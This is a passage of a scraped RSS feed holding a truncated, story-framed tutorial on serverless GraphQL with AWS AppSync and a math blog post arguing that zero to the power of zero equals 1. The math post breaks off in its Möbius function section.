<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
            

            <p>
                <a href="https://serverless.pub/author/slobodan">Slobodan Stojanović</a> in <a href="https://serverless.pub/category/Serverless">Serverless</a> <i></i> <i></i> 

  20 minutes

            </p>

            <p>Every story needs a hero. But, not all heroes are the same. Some of them have superpowers, and some are ordinary people. This story’s hero is just a regular software developer who works in a small team on a medium-size application. Our hero loves his job most of the time, except when he sends a test push notification to thousands of their customers in production, like a few minutes ago.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/01-push-notifications.png" alt=""></p>

<p>One day, his boss came with a new project. “We need to build a new complex application for our new important customer.” Nice, our hero loves challenges! “But we need to do it fast, as we have a short deadline because they have an important marketing event!” Ok, how fast do we need to build an app? “It needs to be ready for yesterday. And it needs to be real-time and scalable!”</p>

<p>The new project is a big challenge for our hero, as he never did that kind of project. Can he even do it?</p>

<p>“You can do it,” his boss says. “I also hired a famous consultant to help you.” That’s awesome! Challenge accepted.</p>

<p>After a full-day meeting with the consultant, and a whiteboard full of weird diagrams, the plan was simple: “Just use Kubernetes!”</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/02-consultant.png" alt=""></p>

<p>But our hero doesn’t know Kubernetes. And there’s no time to learn it now. What should he do?</p>

<p>He started wondering if he is the only one who doesn’t know Kubernetes. Is he good enough for this job?</p>

<p>Our hero spent a sleepless night in front of his computer with his faithful sidekick, a rubber duck. He tried to learn as much as he can about this new technology. But he ended up more confused and tired.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/03-sidekick.png" alt=""></p>

<h2 id="you-should-try-serverless-graphql">You should try Serverless GraphQL</h2>

<p>In the middle of the night, our hero’s faithful sidekick said, “you should try serverless GraphQL.”</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/04-try-serverless-graphql.png" alt=""></p>

<p>Was he dreaming? And what the heck is serverless GraphQL? He knows what serverless is, but what’s GraphQL?</p>

<h3 id="whats-graphql">What’s GraphQL</h3>

<p>Do you remember when Mark Zuckerberg <a href="https://techcrunch.com/2012/09/11/mark-zuckerberg-our-biggest-mistake-with-mobile-was-betting-too-much-on-html5/">said</a>, “our biggest mistake was betting too much on HTML5?” It was a long time ago, back in 2012, when HTML5 was in its early days.</p>

<p>At that moment, the Facebook mobile app was an HTML5 web app embedded in the native mobile shell. They served all the news feed updates as HTML data from the server. However, HTML5 was in its early days, and the mobile web views were not performant enough, so the app wasn’t stable and scalable enough.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/05-fb-mobile-app.png" alt=""></p>

<p>In 2012, Facebook’s engineering team started rebuilding their mobile and switching to the native iOS and Android apps. They evaluated different options for delivering the news feed data, including RESTful services  and Facebook Query Language (FQL).</p>

<p>In the <a href="https://engineering.fb.com/2015/09/14/core-data/graphql-a-data-query-language/">“GraphQL: A data query language”</a> article in 2015, Lee Byron wrote:</p>

<blockquote>
  <p>We were frustrated with the differences between the data we wanted to use in our apps and the server queries they required. We don’t think of data in terms of resource URLs, secondary keys, or join tables; we think about it in terms of a graph of objects and the models we ultimately use in our apps like NSObjects or JSON.</p>
</blockquote>

<p>This frustration led the Facebook engineering team to rethink the way they serve data to their mobile application. Instead of returning a full model with a lot of unnecessary data, they tried to develop a new system to return only the data the application needed.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/06-data.png" alt=""></p>

<p>In 2015, they <a href="https://engineering.fb.com/2015/09/14/core-data/graphql-a-data-query-language/">announced</a> GraphQL, an open-source data query language. The idea behind GraphQL was simple, the client defines the data structure, and the server provides a JSON response with precisely the same format.</p>

<p>For example, the client wants to get the user with a specified ID. However, the application needs only the user’s name, a profile photo with a specific size, and the first five friend connections. Instead of sending two or three different requests to the RESTful API, with GraphQL, you can send a request similar to the one in the image below. And the response will be the JSON with the same structure, as you can see on the right side of the same image.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/07-an-example.jpg" alt=""></p>

<p>That sounds nice and smart. But why should our hero care about GraphQL? He doesn’t have the same problem Facebook had.</p>

<p>The problem Facebook’s engineering team had was the leading cause for inventing GraphQL. However, that’s not the only problem GraphQL solves. If you have one of the following symptoms, GraphQL might be the cure for the problems your application faces, too:</p>

<ul>
  <li>Distinct front end clients for multiple platforms, such as web and mobile, have different data requirements.</li>
  <li>Your back end serves data to your client apps from different sources. For example, your app has SQL and NoSQL databases, and it connects to some external systems.</li>
  <li>Your app has a complex state and caching managements for both front end and back end.</li>
  <li>Slow pages, especially on mobile, caused by multiple dependant HTTP requests.</li>
</ul>

<p>This list is not complete, and GraphQL can bring even more benefits to your application. Some of the main characteristics of GraphQL are:</p>

<ul>
  <li>It defines a data shape. The request always specifies the response’s form, which makes requests more predictable and easier to use.</li>
  <li>It’s hierarchical. Its strict relation between objects with graph-structured data simplifies getting data from multiple sources.</li>
  <li>It’s strongly typed. It can give you descriptive error messages before you run a query.</li>
  <li>It’s a protocol, not storage. Each GraphQL field is backed by a function on the back end, which allows you to connect it to any storage you want in the background.</li>
  <li>It’s introspective. You can query the GraphQL server for the types it supports. This gives you built-in documentation and also a base for a powerful toolset.</li>
  <li>It’s version free. The shape of the data is always defined by the client’s request, which means adding additional fields to your model will not affect your client application until you change the query itself.</li>
</ul>

<p>To combine data from multiple sources using RESTful API, you often send multiple HTTP requests and then connect data on the client-side. This works fine in perfect conditions. However, users don’t always use your app in ideal conditions. They are often on mobile with a limited or unstable network. Or they live in Australia, and each request is a few hundred milliseconds slower.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/08-multiple-data-sources.gif" alt=""></p>

<p>With GraphQL, you can archive the same with a single request. This will push a bit more load to the server-side, but that works just fine in most cases. It’s even better when you don’t own the server.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/09-graphql-request.gif" alt=""></p>

<h3 id="where-to-start-with-graphql">Where to start with GraphQL</h3>

<p>With GraphQL, you start by shaping your data using types. For example, if you are building a blog, you will have an author and a post, similar to the following code snippet. Each post will have its id, a name, a title, and an author. Authors have their ids, names, and a list of their posts.</p>

<p>As you can see, types also define a relation between an author and posts.</p>

<div><div><pre><code><span>type</span><span> </span><span>Author</span><span> </span><span>{</span><span>
  </span><span>id</span><span>:</span><span> </span><span>Int</span><span>
  </span><span>name</span><span>:</span><span> </span><span>String</span><span>
  </span><span>posts</span><span>:</span><span> </span><span>[</span><span>Post</span><span>]</span><span>
</span><span>}</span><span>

</span><span>type</span><span> </span><span>Post</span><span> </span><span>{</span><span>
  </span><span>id</span><span>:</span><span> </span><span>Int</span><span>
  </span><span>title</span><span>:</span><span> </span><span>String</span><span>
  </span><span>text</span><span>:</span><span> </span><span>String</span><span>
  </span><span>author</span><span>:</span><span> </span><span>Author</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Once you have types, you can build your GraphQL schema. In the code snippet below, we define two queries: get author by ID and get posts by title. Each of these queries defines input parameters with their types and a return type.</p>

<div><div><pre><code><span>type</span><span> </span><span>Query</span><span> </span><span>{</span><span>
  </span><span>getAuthor</span><span>(</span><span>id</span><span>:</span><span> </span><span>Int</span><span>):</span><span> </span><span>Author</span><span>
  </span><span>getPostsByTitle</span><span>(</span><span>titleContains</span><span>:</span><span> </span><span>String</span><span>):</span><span> </span><span>[</span><span>Post</span><span>]</span><span>
</span><span>}</span><span>

</span><span>schema</span><span> </span><span>{</span><span>
  </span><span>query</span><span>:</span><span> </span><span>Query</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>As GraphQL is not storage but a protocol, we need to tell GraphQL where and how it can read the data by creating resolvers. In the following code snippet, we define two resolvers: one for the author that connects to the SQL database and one for a list of posts sends an HTTP request to the blog platform API.</p>

<div><div><pre><code>getAuthor(_, args){
  return sql.raw('SELECT * FROM authors WHERE id = %s', args.id);
}

posts(author){
  return request(`https://api.blog.io/by_author/${author.id}`);
}
</code></pre></div></div>

<p>Finally, we can run the query. As we defined queries, we can ask for an author by their ID. Relations allow us to get a list of all author’s posts in the same request. And if we ask for the author’s name for each blog post, that name will be the same as the author’s name above because it points to the same author.</p>

<div><div><pre><code><span>{</span><span>
  </span><span>getAuthor</span><span>(</span><span>id</span><span>:</span><span> </span><span>5</span><span>){</span><span>
    </span><span>name</span><span>
    </span><span>posts</span><span> </span><span>{</span><span>
      </span><span>title</span><span>
      </span><span>author</span><span> </span><span>{</span><span>
        </span><span># this will be the same as the name above</span><span>
        </span><span>name</span><span>
      </span><span>}</span><span>
    </span><span>}</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Once we run the query, GraphQL will parse the request, then validate the types and data shape, and finally, if the first two steps are correct, it will run the query and our resolvers. Once we receive the data, it’ll look similar to the following JSON data:</p>

<div><div><pre><code><span>{</span><span>
  </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>,</span><span>
  </span><span>"posts"</span><span>:</span><span> </span><span>[{</span><span>
    </span><span>"title"</span><span>:</span><span> </span><span>"The power of serverless GraphQL with AppSync"</span><span>,</span><span>
    </span><span>"author"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>
    </span><span>}</span><span>
  </span><span>},</span><span> </span><span>{</span><span>
    </span><span>"title"</span><span>:</span><span> </span><span>"Handling webhooks with EventBridge, SAM and SAR"</span><span>,</span><span>
    </span><span>"author"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>
    </span><span>}</span><span>
  </span><span>}]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>By GraphQL specification, queries read the data. GraphQL specification also defines mutations and subscriptions. Mutations modify the existing data (i.e., add a new author or edit post), and subscriptions can notify you whenever the data is changed (i.e., it’ll run whenever the post is published).</p>

<h3 id="why-do-we-need-serverless-graphql">Why do we need serverless GraphQL?</h3>

<p>“You can always deploy your GraphQL using Kubernetes and write your resolvers by hand,” the rubber duck said, “but there’s an easier way.”</p>

<p>GraphQL makes retrieving your data from the client-side effortless, but you still need to manage and scale your infrastructure. And now, you have one central place that controls all of your requests. Unless you do the same you do with the other web applications – make your application serverless. Serverless GraphQL brings the best of both worlds: GraphQL makes you client-to-server connection effortless, and serverless simplifies maintenance of your infrastructure.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/10-scaling.png" alt=""></p>

<p>“Interesting, but how do I make GraphQL application serverless?”</p>

<p>“There are many ways to do that,” the rubber duck said. “You can do that manually using the familiar serverless services. For example, on AWS, you can use Amazon API …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serverless.pub/the-power-of-serverless-graphql-with-appsync/">https://serverless.pub/the-power-of-serverless-graphql-with-appsync/</a></em></p>]]>
            </description>
            <link>https://serverless.pub/the-power-of-serverless-graphql-with-appsync/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069006</guid>
            <pubDate>Thu, 12 Nov 2020 12:18:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero to the Power of Zero]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068785">thread link</a>) | @nathell
<br/>
November 12, 2020 | https://sortingsearching.com/2020/11/11/zero-power-zero.html | <a href="https://web.archive.org/web/*/https://sortingsearching.com/2020/11/11/zero-power-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="the-controversy">The controversy</h2>

<p>The value of 0<sup>0</sup> is controversial.</p>

<p><a href="https://en.wikipedia.org/wiki/Zero_to_the_power_of_zero">Wikipedia</a> says:</p>

<blockquote>
  <p>Zero to the power of zero, denoted by 0<sup>0</sup>, is a mathematical expression with no agreed-upon value.
The most common possibilities are 1 or leaving the expression undefined,
with justifications existing for each, depending on context.</p>
</blockquote>

<p>Mathematica and <a href="https://www.wolframalpha.com/input/?i=0%5E0">WolframAlpha</a> refuse to compute the value.</p>

<p>Some textbooks on mathematical analysis, when defining exponentiation, explicitly leave 0<sup>0</sup> undefined
as an exception.</p>

<p>On the other hand, the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> floating point standard specifies
that 0.0<sup>0.0</sup> = 1.0 and as a result, most programming languages implement it that way.</p>

<p>Spoiler: I will argue that the value of 1 is clearly “correct”. Of course it’s a matter of definition,
one can in theory define the operation to do anything, but it is “correct” in the sense that it is the only sensible
value, consistent with all applications, and moreover, it is a very important value. It is also
implicitly assumed to be 1 in various formulas even by those people who insist it should not be 1.</p>

<p>I will also show that the argument against defining 0<sup>0</sup> essentially relies on a mistake:
an incorrect algorithm for computing limits that is unfortunately often taught in schools. Refusal
to define 0<sup>0</sup> is a futile attempt to salvage the correctness of the algorithm, which however
does not actually solve the problem in general.</p>

<h2 id="definition">Definition</h2>

<p>The simplest way to resolve the issue seems to be to start with a definition, plug in zeroes, and see
what we get.</p>

<p>A <strong>semigroup</strong> is a set of objects with an associative multiplication operation. This is a very
general concept: it can be natural numbers, real numbers, square matrices, linear operators, all
kinds of things.</p>

<p>In any semigroup we can define exponentiation to any positive integral power:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mn>1</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>x</mi><mi>n</mi></msup><mo>⋅</mo><mi>x</mi></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
x^1 &amp;= x \\
x^{n+1} &amp;= x^n \cdot x
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>Often a semigroup has an identity element <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span></span>
such that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo>⋅</mo><mi>x</mi><mo>=</mo><mi>x</mi><mo>⋅</mo><mi>I</mi><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">I\cdot x = x\cdot I = x</annotation></semantics></math></span></span>.
For numbers, it’s just the number 1. For matrices, it’s the identity matrix.
Such a semigroup is called a <strong>monoid</strong>.</p>

<p>In a monoid we expand and simplify the definition of exponentiation to include the 0 exponent:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mn>0</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>I</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>x</mi><mi>n</mi></msup><mo>⋅</mo><mi>x</mi></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
x^0 &amp;= I \\
x^{n+1} &amp;= x^n \cdot x
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>Well, now just plug in x=0 into that definition and what do you get: 0<sup>0</sup> = 1.</p>

<p>This definition can then be extended to negative exponents, rational exponents, even irrational exponents.
But since we’re only concerned with 0<sup>0</sup> here, we’re not going to go further.</p>

<h2 id="the-0n-function">The 0<sup>n</sup> function</h2>

<p>Since 0<sup>n</sup> = 0 for all n &gt; 0, one might think that the most natural thing to expect is
that it would also be true for n = 0. However we see from the definition that it is not so.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mi>n</mi></msup><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^n =
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
= [n=0]
</annotation></semantics></math></span></span></p>

<p>We have here used the <a href="https://en.wikipedia.org/wiki/Iverson_bracket">Iverson bracket</a> notation.</p>

<p>This seems like a strangely complicated formula for 0<sup>n</sup>, but we will see that it is in fact
a very nice and useful function.</p>

<h2 id="combinatorics">Combinatorics</h2>

<p>What is the number of sequences of n letters, selected from an alphabet of size A? It’s A<sup>n</sup>.</p>

<p>What if the alphabet is empty, A=0? Then the number of sequences is:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mi>n</mi></msup><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^n = [n = 0] =
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
</annotation></semantics></math></span></span></p>

<p>Does this make sense? Yes! If n &gt; 0, we can’t form a sequence, because
we will get stuck when trying to write the first letter. But when n=0, there is no problem! We don’t
have to write any letters, so it’s fine if the alphabet is empty. There is exactly one way to do it:
write an empty sequence of letters.</p>

<h2 id="the-exp-function">The exp function</h2>

<p>The exponential function has the following basic property, often taken to define exp in the first place:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>exp</mi><mo>⁡</mo><mi>x</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><msup><mi>x</mi><mi>n</mi></msup><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\exp x = \sum_{n=0}^{\infty} \frac{x^n}{n!}
</annotation></semantics></math></span></span></p>

<p>Let’s plug in x=0:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>exp</mi><mo>⁡</mo><mn>0</mn><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><msup><mn>0</mn><mi>n</mi></msup><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><mrow><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mn>0</mn><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\exp 0 = \sum_{n=0}^{\infty} \frac{0^n}{n!} = \sum_{n=0}^{\infty} \frac{[n=0]}{n!} = \frac{1}{0!} = 1
</annotation></semantics></math></span></span></p>

<p>The 0<sup>n</sup> function played an essential role in this calculation.</p>

<h2 id="the-binomial-distribution">The binomial distribution</h2>

<p>The binomial distribution is a probability distribution of the number of successes in n independent
trials, each successful with probability p. The formula is:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>Pr</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><msup><mi>p</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\Pr(X = k) = \binom{n}{k}p^k(1-p)^{n-k}
</annotation></semantics></math></span></span></p>

<p>What if p=0?</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>Pr</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><msup><mn>0</mn><mi>k</mi></msup><msup><mn>1</mn><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>k</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>k</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\Pr(X = k) &amp;= \binom{n}{k}0^k1^{n-k} = \binom{n}{k}[k=0] = [k=0] \\
&amp;=
\begin{cases}
1 &amp;\text{if } k = 0 \\
0 &amp;\text{if } k &gt; 0
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>This makes sense! k=0 successes is certain, any other outcome is impossible.</p>

<h2 id="even-cardinality-subsets">Even-cardinality subsets</h2>

<p>Given a set of n elements, how many more even-cardinality subsets are there than odd-cardinality subsets?</p>

<p>We can calculate it like this:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup><msup><mn>1</mn><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo>+</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><msup><mn>0</mn><mi>n</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\sum_{k=0}^n \binom{n}{k}(-1)^k &amp;= \sum_{k=0}^n \binom{n}{k}(-1)^k1^{n-k} = (-1 + 1)^n = 0^n \\
&amp;=
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>And indeed, for n=0 we have 1 even-cardinality subset (the empty set), and no odd-cardinality subsets,
while for n&gt;0 there are as many even as odd cardinality subsets.</p>

<h2 id="möbius-function">Möbius function</h2>

<p>The <a href="https://en.wikipedia.org/wiki/M%C3%B6bius_function">Möbius function</a> <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mu(n)</annotation></semantics></math></span></span>
is a useful <a href="https://en.wikipedia.org/wiki/Multiplicative_function">multiplicative function</a> in number theory.</p>

<p>One important property of it concerns sums over divisors of a positive integer n:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>d</mi><mi mathvariant="normal">∣</mi><mi>n</mi></mrow></munder><mi>μ</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">)</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
S(n) = \sum_{d|n} \mu(d)
</annotation></semantics></math></span></span></p>

<p>It can be shown that since μ is multiplicative, S is also multiplicative.</p>

<p>Also for prime p and α &gt; 0:</p>
